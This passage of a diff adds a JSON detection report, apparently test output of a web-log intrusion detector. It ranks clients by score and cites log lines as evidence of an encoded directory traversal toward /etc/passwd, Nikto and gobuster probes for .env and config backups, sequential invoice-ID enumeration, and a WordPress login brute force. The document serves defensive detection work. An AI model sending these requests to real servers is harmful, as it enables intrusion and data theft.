+            "203.0.113.25 - - [01/Nov/2026:04:45:05 +0000] \"GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1\" 403 271 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.25 - - [01/Nov/2026:04:45:33 +0000] \"GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1\" 403 578 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.25 - - [01/Nov/2026:04:45:45 +0000] \"GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1\" 404 510 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+          ],
+          "detail": "4 matching request(s); patterns: repeated-dotdot, dotdot-target, etc-passwd."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.11",
+      "score": 45,
+      "severity": "medium",
+      "stages": [
+        "recon"
+      ],
+      "first_seen": "2026-11-01T02:39:35+00:00",
+      "last_seen": "2026-11-01T02:48:19+00:00",
+      "summary": "203.0.113.11 ran a nikto scan, probed for sensitive files, then probed many missing paths over nine minutes (40 misses across 40 paths).",
+      "alerts": [
+        {
+          "rule_id": "SIG-UA-SCANNER",
+          "title": "Known scanner user agent",
+          "severity": "medium",
+          "client_ip": "203.0.113.11",
+          "first_seen": "2026-11-01T02:39:35+00:00",
+          "last_seen": "2026-11-01T02:48:19+00:00",
+          "event_count": 84,
+          "technique": "T1595.002",
+          "evidence": [
+            "203.0.113.11 - - [01/Nov/2026:02:39:35 +0000] \"GET /config.php.old HTTP/1.1\" 404 187 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+            "203.0.113.11 - - [01/Nov/2026:02:39:39 +0000] \"GET /phpinfo.php HTTP/1.1\" 404 501 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+            "203.0.113.11 - - [01/Nov/2026:02:39:41 +0000] \"GET /.env HTTP/1.1\" 404 306 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+            "203.0.113.11 - - [01/Nov/2026:02:39:45 +0000] \"GET /.htpasswd HTTP/1.1\" 404 204 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+            "203.0.113.11 - - [01/Nov/2026:02:39:49 +0000] \"GET /wp-config.php.bak HTTP/1.1\" 404 450 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\""
+          ],
+          "detail": "84 matching request(s); patterns: scanner-ua."
+        },
+        {
+          "rule_id": "SIG-SENSITIVE-PATH",
+          "title": "Probe for sensitive file or path",
+          "severity": "medium",
+          "client_ip": "203.0.113.11",
+          "first_seen": "2026-11-01T02:39:35+00:00",
+          "last_seen": "2026-11-01T02:40:10+00:00",
+          "event_count": 12,
+          "technique": "T1595.003",
+          "evidence": [
+            "203.0.113.11 - - [01/Nov/2026:02:39:35 +0000] \"GET /config.php.old HTTP/1.1\" 404 187 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+            "203.0.113.11 - - [01/Nov/2026:02:39:39 +0000] \"GET /phpinfo.php HTTP/1.1\" 404 501 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+            "203.0.113.11 - - [01/Nov/2026:02:39:41 +0000] \"GET /.env HTTP/1.1\" 404 306 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+            "203.0.113.11 - - [01/Nov/2026:02:39:45 +0000] \"GET /.htpasswd HTTP/1.1\" 404 204 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+            "203.0.113.11 - - [01/Nov/2026:02:39:49 +0000] \"GET /wp-config.php.bak HTTP/1.1\" 404 450 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\""
+          ],
+          "detail": "12 matching request(s); patterns: backup-file, phpinfo, dotenv, cloud-creds, wp-config, db-admin, git-dir, cgi-bin, server-status."
+        },
+        {
+          "rule_id": "BEH-LOW-AND-SLOW",
+          "title": "Low-and-slow path enumeration",
+          "severity": "medium",
+          "client_ip": "203.0.113.11",
+          "first_seen": "2026-11-01T02:39:35+00:00",
+          "last_seen": "2026-11-01T02:48:19+00:00",
+          "event_count": 84,
+          "technique": "T1595.003",
+          "evidence": [
+            "203.0.113.11 - - [01/Nov/2026:02:42:44 +0000] \"GET /test/images2.php HTTP/1.1\" 404 151 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+            "203.0.113.11 - - [01/Nov/2026:02:42:48 +0000] \"GET /backup/api-v1.php HTTP/1.1\" 404 193 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+            "203.0.113.11 - - [01/Nov/2026:02:42:54 +0000] \"GET /web/db.php HTTP/1.1\" 404 583 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+            "203.0.113.11 - - [01/Nov/2026:02:43:04 +0000] \"GET /web/cms.php HTTP/1.1\" 404 479 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\"",
+            "203.0.113.11 - - [01/Nov/2026:02:43:15 +0000] \"GET /data/uploads.php HTTP/1.1\" 404 309 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.5.0)\""
+          ],
+          "detail": "40 miss responses (401/403/404/410) of 40 requests (100%) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.12",
+      "score": 45,
+      "severity": "medium",
+      "stages": [
+        "recon"
+      ],
+      "first_seen": "2026-11-01T03:34:33+00:00",
+      "last_seen": "2026-11-01T03:35:52+00:00",
+      "summary": "203.0.113.12 ran a gobuster scan, then enumerated paths (80 requests answered 404/403/410).",
+      "alerts": [
+        {
+          "rule_id": "SIG-UA-SCANNER",
+          "title": "Known scanner user agent",
+          "severity": "medium",
+          "client_ip": "203.0.113.12",
+          "first_seen": "2026-11-01T03:34:33+00:00",
+          "last_seen": "2026-11-01T03:35:52+00:00",
+          "event_count": 80,
+          "technique": "T1595.002",
+          "evidence": [
+            "203.0.113.12 - - [01/Nov/2026:03:34:33 +0000] \"GET /portal HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+            "203.0.113.12 - - [01/Nov/2026:03:34:35 +0000] \"GET /images2 HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+            "203.0.113.12 - - [01/Nov/2026:03:34:37 +0000] \"GET /db HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+            "203.0.113.12 - - [01/Nov/2026:03:34:38 +0000] \"GET /web HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+            "203.0.113.12 - - [01/Nov/2026:03:34:38 +0000] \"GET /secret HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\""
+          ],
+          "detail": "80 matching request(s); patterns: scanner-ua."
+        },
+        {
+          "rule_id": "BEH-404-BURST",
+          "title": "Burst of 404/403/410 responses (path enumeration)",
+          "severity": "medium",
+          "client_ip": "203.0.113.12",
+          "first_seen": "2026-11-01T03:34:33+00:00",
+          "last_seen": "2026-11-01T03:35:52+00:00",
+          "event_count": 80,
+          "technique": "T1595.003",
+          "evidence": [
+            "203.0.113.12 - - [01/Nov/2026:03:34:46 +0000] \"GET /staging HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+            "203.0.113.12 - - [01/Nov/2026:03:34:47 +0000] \"GET /uploads HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+            "203.0.113.12 - - [01/Nov/2026:03:34:47 +0000] \"GET /backup HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+            "203.0.113.12 - - [01/Nov/2026:03:34:49 +0000] \"GET /tmp HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+            "203.0.113.12 - - [01/Nov/2026:03:34:51 +0000] \"GET /test HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\""
+          ],
+          "detail": "20 miss responses (404/403/410) within 60s (threshold 20); consistent with directory guessing."
+        },
+        {
+          "rule_id": "BEH-LOW-AND-SLOW",
+          "title": "Low-and-slow path enumeration",
+          "severity": "medium",
+          "client_ip": "203.0.113.12",
+          "first_seen": "2026-11-01T03:34:33+00:00",
+          "last_seen": "2026-11-01T03:35:52+00:00",
+          "event_count": 80,
+          "technique": "T1595.003",
+          "evidence": [
+            "203.0.113.12 - - [01/Nov/2026:03:35:08 +0000] \"GET /files2 HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+            "203.0.113.12 - - [01/Nov/2026:03:35:09 +0000] \"GET /logs2 HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+            "203.0.113.12 - - [01/Nov/2026:03:35:09 +0000] \"GET /data2 HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+            "203.0.113.12 - - [01/Nov/2026:03:35:10 +0000] \"GET /web2 HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\"",
+            "203.0.113.12 - - [01/Nov/2026:03:35:10 +0000] \"GET /site2 HTTP/1.1\" 404 0 \"-\" \"gobuster/3.6\""
+          ],
+          "detail": "40 miss responses (401/403/404/410) of 40 requests (100%) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules."
+        }
+      ]
+    },
+    {
+      "client_ip": "2001:db8:5eed:9::/64",
+      "score": 40,
+      "severity": "medium",
+      "stages": [
+        "recon"
+      ],
+      "first_seen": "2026-11-01T00:00:33+00:00",
+      "last_seen": "2026-11-01T05:56:36+00:00",
+      "summary": "Clients in 2001:db8:5eed:9::/64 (30 addresses) probed slowly over six hours (40 misses across 40 paths), then walked sequential IDs on /v1/projects/{id} (25 IDs, range 1000-1048).",
+      "alerts": [
+        {
+          "rule_id": "BEH-LOW-AND-SLOW",
+          "title": "Low-and-slow path enumeration",
+          "severity": "medium",
+          "client_ip": "2001:db8:5eed:9::/64",
+          "first_seen": "2026-11-01T00:00:33+00:00",
+          "last_seen": "2026-11-01T05:56:36+00:00",
+          "event_count": 103,
+          "technique": "T1595.003",
+          "evidence": [
+            "2001:db8:5eed:9:59aa:c584:7047:c0a6 - - [01/Nov/2026:01:59:03 +0000] \"GET /v1/projects/1036 HTTP/1.1\" 403 582 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+            "2001:db8:5eed:9:76bb:a2a9:5cb9:bee3 - - [01/Nov/2026:02:02:28 +0000] \"GET /v1/billing-37 HTTP/1.1\" 403 193 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+            "2001:db8:5eed:9:ba6a:d9cf:c2c7:2e3c - - [01/Nov/2026:02:05:54 +0000] \"GET /v1/projects/1038 HTTP/1.1\" 403 531 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+            "2001:db8:5eed:9:e4e8:fda6:6a0c:2c4c - - [01/Nov/2026:02:08:26 +0000] \"GET /v1/backup-39 HTTP/1.1\" 404 381 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+            "2001:db8:5eed:9:c430:c37e:80b3:af69 - - [01/Nov/2026:02:13:38 +0000] \"GET /v1/internal-41 HTTP/1.1\" 404 582 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\""
+          ],
+          "detail": "distributed across 30 addresses in 2001:db8:5eed:9::/64: 40 miss responses (401/403/404/410) of 42 requests (95%) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules."
+        },
+        {
+          "rule_id": "BEH-ID-ENUM",
+          "title": "Sequential ID enumeration",
+          "severity": "medium",
+          "client_ip": "2001:db8:5eed:9::/64",
+          "first_seen": "2026-11-01T00:00:33+00:00",
+          "last_seen": "2026-11-01T05:53:23+00:00",
+          "event_count": 55,
+          "technique": "T1595.003",
+          "evidence": [
+            "2001:db8:5eed:9:eaa3:9ba8:6417:dd37 - - [01/Nov/2026:02:11:07 +0000] \"GET /v1/projects/1040 HTTP/1.1\" 200 21602 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+            "2001:db8:5eed:9:2d00:bc16:5c2c:e8bd - - [01/Nov/2026:02:16:12 +0000] \"GET /v1/projects/1042 HTTP/1.1\" 401 442 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+            "2001:db8:5eed:9:1c4:a15d:23d7:1e53 - - [01/Nov/2026:02:23:08 +0000] \"GET /v1/projects/1044 HTTP/1.1\" 404 489 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+            "2001:db8:5eed:9:571a:b4ee:510c:b28a - - [01/Nov/2026:02:28:24 +0000] \"GET /v1/projects/1046 HTTP/1.1\" 403 247 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+            "2001:db8:5eed:9:79e6:9be5:aa50:962 - - [01/Nov/2026:02:36:33 +0000] \"GET /v1/projects/1048 HTTP/1.1\" 404 399 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\""
+          ],
+          "detail": "distributed across 15 addresses in 2001:db8:5eed:9::/64: template /v1/projects/{id}: 25 distinct IDs (1000..1048) within 21600s forming a sequential walk; 23 answered non-2xx; refusal signal: 92% of IDs answered 401/403/404/410."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.28",
+      "score": 40,
+      "severity": "medium",
+      "stages": [
+        "recon"
+      ],
+      "first_seen": "2026-11-01T00:24:23+00:00",
+      "last_seen": "2026-11-01T05:05:01+00:00",
+      "summary": "203.0.113.28 probed slowly over five hours (40 misses across 40 paths), then walked sequential IDs on /v1/invoices/{id} (25 IDs, range 5000-5024).",
+      "alerts": [
+        {
+          "rule_id": "BEH-LOW-AND-SLOW",
+          "title": "Low-and-slow path enumeration",
+          "severity": "medium",
+          "client_ip": "203.0.113.28",
+          "first_seen": "2026-11-01T00:24:23+00:00",
+          "last_seen": "2026-11-01T05:01:52+00:00",
+          "event_count": 43,
+          "technique": "T1595.003",
+          "evidence": [
+            "203.0.113.28 - - [01/Nov/2026:04:09:31 +0000] \"GET /v1/invoices/5064 HTTP/1.1\" 403 280 \"-\" \"python-requests/2.31.0\"",
+            "203.0.113.28 - - [01/Nov/2026:04:12:59 +0000] \"GET /v1/invoices/5065 HTTP/1.1\" 403 267 \"-\" \"python-requests/2.31.0\"",
+            "203.0.113.28 - - [01/Nov/2026:04:16:21 +0000] \"GET /v1/invoices/5066 HTTP/1.1\" 403 548 \"-\" \"python-requests/2.31.0\"",
+            "203.0.113.28 - - [01/Nov/2026:04:19:24 +0000] \"GET /v1/invoices/5067 HTTP/1.1\" 403 302 \"-\" \"python-requests/2.31.0\"",
+            "203.0.113.28 - - [01/Nov/2026:04:36:44 +0000] \"GET /v1/invoices/5072 HTTP/1.1\" 403 482 \"-\" \"python-requests/2.31.0\""
+          ],
+          "detail": "40 miss responses (401/403/404/410) of 73 requests (55%) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules."
+        },
+        {
+          "rule_id": "BEH-ID-ENUM",
+          "title": "Sequential ID enumeration",
+          "severity": "medium",
+          "client_ip": "203.0.113.28",
+          "first_seen": "2026-11-01T00:24:23+00:00",
+          "last_seen": "2026-11-01T05:05:01+00:00",
+          "event_count": 81,
+          "technique": "T1595.003",
+          "evidence": [
+            "203.0.113.28 - - [01/Nov/2026:01:33:39 +0000] \"GET /v1/invoices/5020 HTTP/1.1\" 200 13915 \"-\" \"python-requests/2.31.0\"",
+            "203.0.113.28 - - [01/Nov/2026:01:36:53 +0000] \"GET /v1/invoices/5021 HTTP/1.1\" 200 22474 \"-\" \"python-requests/2.31.0\"",
+            "203.0.113.28 - - [01/Nov/2026:01:40:24 +0000] \"GET /v1/invoices/5022 HTTP/1.1\" 200 15056 \"-\" \"python-requests/2.31.0\"",
+            "203.0.113.28 - - [01/Nov/2026:01:44:04 +0000] \"GET /v1/invoices/5023 HTTP/1.1\" 403 434 \"-\" \"python-requests/2.31.0\"",
+            "203.0.113.28 - - [01/Nov/2026:01:47:35 +0000] \"GET /v1/invoices/5024 HTTP/1.1\" 200 3640 \"-\" \"python-requests/2.31.0\""
+          ],
+          "detail": "template /v1/invoices/{id}: 25 distinct IDs (5000..5024) within 21600s forming a sequential walk; 15 answered non-2xx; refusal signal: 60% of IDs answered 401/403/404/410."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.21",
+      "score": 40,
+      "severity": "medium",
+      "stages": [
+        "recon"
+      ],
+      "first_seen": "2026-11-01T00:39:19+00:00",
+      "last_seen": "2026-11-01T00:51:33+00:00",
+      "summary": "203.0.113.21 enumerated paths (150 requests answered 404/403/410).",
+      "alerts": [
+        {
+          "rule_id": "BEH-404-BURST",
+          "title": "Burst of 404/403/410 responses (path enumeration)",
+          "severity": "medium",
+          "client_ip": "203.0.113.21",
+          "first_seen": "2026-11-01T00:39:19+00:00",
+          "last_seen": "2026-11-01T00:51:33+00:00",
+          "event_count": 150,
+          "technique": "T1595.003",
+          "evidence": [
+            "203.0.113.21 - - [01/Nov/2026:00:46:59 +0000] \"GET /files4/ HTTP/1.1\" 404 198 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.21 - - [01/Nov/2026:00:47:05 +0000] \"GET /logs4/ HTTP/1.1\" 403 324 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.21 - - [01/Nov/2026:00:47:09 +0000] \"GET /data4/ HTTP/1.1\" 404 208 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.21 - - [01/Nov/2026:00:47:14 +0000] \"GET /web4/ HTTP/1.1\" 404 518 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.21 - - [01/Nov/2026:00:47:19 +0000] \"GET /site4/ HTTP/1.1\" 404 276 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+          ],
+          "detail": "slow enumeration: 100 miss responses (404/403/410) within 900s (threshold 100); consistent with directory guessing."
+        },
+        {
+          "rule_id": "BEH-LOW-AND-SLOW",
+          "title": "Low-and-slow path enumeration",
+          "severity": "medium",
+          "client_ip": "203.0.113.21",
+          "first_seen": "2026-11-01T00:39:19+00:00",
+          "last_seen": "2026-11-01T00:51:33+00:00",
+          "event_count": 150,
+          "technique": "T1595.003",
+          "evidence": [
+            "203.0.113.21 - - [01/Nov/2026:00:42:10 +0000] \"GET /files1/ HTTP/1.1\" 403 570 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.21 - - [01/Nov/2026:00:42:15 +0000] \"GET /logs1/ HTTP/1.1\" 404 488 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.21 - - [01/Nov/2026:00:42:19 +0000] \"GET /data1/ HTTP/1.1\" 404 386 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.21 - - [01/Nov/2026:00:42:25 +0000] \"GET /web1/ HTTP/1.1\" 404 435 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.21 - - [01/Nov/2026:00:42:31 +0000] \"GET /site1/ HTTP/1.1\" 404 190 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+          ],
+          "detail": "40 miss responses (401/403/404/410) of 40 requests (100%) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules."
+        }
+      ]
+    },
+    {
+      "client_ip": "2001:db8:bad:1::/64",
+      "score": 40,
+      "severity": "medium",
+      "stages": [
+        "recon"
+      ],
+      "first_seen": "2026-11-01T01:23:58+00:00",
+      "last_seen": "2026-11-01T01:25:37+00:00",
+      "summary": "Clients in 2001:db8:bad:1::/64 (200 addresses) enumerated paths (200 requests answered 404/403/410).",
+      "alerts": [
+        {
+          "rule_id": "BEH-404-BURST",
+          "title": "Burst of 404/403/410 responses (path enumeration)",
+          "severity": "medium",
+          "client_ip": "2001:db8:bad:1::/64",
+          "first_seen": "2026-11-01T01:23:58+00:00",
+          "last_seen": "2026-11-01T01:25:37+00:00",
+          "event_count": 200,
+          "technique": "T1595.003",
+          "evidence": [
+            "2001:db8:bad:1:253c:5089:e2e:a1ef - - [01/Nov/2026:01:24:05 +0000] \"GET /files/ HTTP/1.1\" 404 533 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "2001:db8:bad:1:b174:c9f2:4600:6fdd - - [01/Nov/2026:01:24:06 +0000] \"GET /logs/ HTTP/1.1\" 404 213 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "2001:db8:bad:1:57e2:ccd5:58f1:37c8 - - [01/Nov/2026:01:24:06 +0000] \"GET /data/ HTTP/1.1\" 404 483 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "2001:db8:bad:1:d4f6:2f4e:ec88:eca5 - - [01/Nov/2026:01:24:06 +0000] \"GET /web/ HTTP/1.1\" 404 383 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "2001:db8:bad:1:cfe4:1c99:a70f:1071 - - [01/Nov/2026:01:24:06 +0000] \"GET /site/ HTTP/1.1\" 404 172 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+          ],
+          "detail": "distributed across 200 addresses in 2001:db8:bad:1::/64: 20 miss responses (404/403/410) within 60s (threshold 20); consistent with directory guessing."
+        },
+        {
+          "rule_id": "BEH-LOW-AND-SLOW",
+          "title": "Low-and-slow path enumeration",
+          "severity": "medium",
+          "client_ip": "2001:db8:bad:1::/64",
+          "first_seen": "2026-11-01T01:23:58+00:00",
+          "last_seen": "2026-11-01T01:25:37+00:00",
+          "event_count": 200,
+          "technique": "T1595.003",
+          "evidence": [
+            "2001:db8:bad:1:9f88:9352:a40c:46da - - [01/Nov/2026:01:24:15 +0000] \"GET /files1/ HTTP/1.1\" 404 563 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "2001:db8:bad:1:4d:e96e:b14e:adc7 - - [01/Nov/2026:01:24:16 +0000] \"GET /logs1/ HTTP/1.1\" 404 271 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "2001:db8:bad:1:2b9:d27d:39b2:9c58 - - [01/Nov/2026:01:24:16 +0000] \"GET /data1/ HTTP/1.1\" 404 520 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "2001:db8:bad:1:c766:270f:c10b:7384 - - [01/Nov/2026:01:24:16 +0000] \"GET /web1/ HTTP/1.1\" 404 228 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "2001:db8:bad:1:e14f:64ef:8800:76b4 - - [01/Nov/2026:01:24:16 +0000] \"GET /site1/ HTTP/1.1\" 404 544 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+          ],
+          "detail": "distributed across 40 addresses in 2001:db8:bad:1::/64: 40 miss responses (401/403/404/410) of 40 requests (100%) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.22",
+      "score": 35,
+      "severity": "medium",
+      "stages": [
+        "credential-access"
+      ],
+      "first_seen": "2026-11-01T01:00:34+00:00",
+      "last_seen": "2026-11-01T01:04:28+00:00",
+      "summary": "203.0.113.22 brute-forced a login (60 login attempts).",
+      "alerts": [
+        {
+          "rule_id": "BEH-BRUTE-FORCE",
+          "title": "Login brute force",
+          "severity": "medium",
+          "client_ip": "203.0.113.22",
+          "first_seen": "2026-11-01T01:00:34+00:00",
+          "last_seen": "2026-11-01T01:04:28+00:00",
+          "event_count": 60,
+          "technique": "T1110",
+          "evidence": [
+            "203.0.113.22 - - [01/Nov/2026:01:00:56 +0000] \"POST /wp-login.php HTTP/1.1\" 200 2645 \"https://shop.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.22 - - [01/Nov/2026:01:01:01 +0000] \"POST /wp-login.php HTTP/1.1\" 200 2583 \"https://shop.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.22 - - [01/Nov/2026:01:01:04 +0000] \"POST /wp-login.php HTTP/1.1\" 200 2628 \"https://shop.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.22 - - [01/Nov/2026:01:01:08 +0000] \"POST /wp-login.php HTTP/1.1\" 200 2629 \"https://shop.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.22 - - [01/Nov/2026:01:01:11 +0000] \"POST /wp-login.php HTTP/1.1\" 200 2509 \"https://shop.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+          ],
+          "detail": "10 login POSTs within 300s (threshold 10); 0 explicit 401/403 failures; status-agnostic; lower confidence."
+        }
+      ]
+    }
+  ],
+  "alerts": [
+    {
+      "rule_id": "BEH-ID-ENUM",
+      "title": "Sequential ID enumeration",
+      "severity": "medium",
+      "client_ip": "2001:db8:5eed:9::/64",
+      "first_seen": "2026-11-01T00:00:33+00:00",
+      "last_seen": "2026-11-01T05:53:23+00:00",
+      "event_count": 55,
+      "technique": "T1595.003",
+      "evidence": [
+        "2001:db8:5eed:9:eaa3:9ba8:6417:dd37 - - [01/Nov/2026:02:11:07 +0000] \"GET /v1/projects/1040 HTTP/1.1\" 200 21602 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
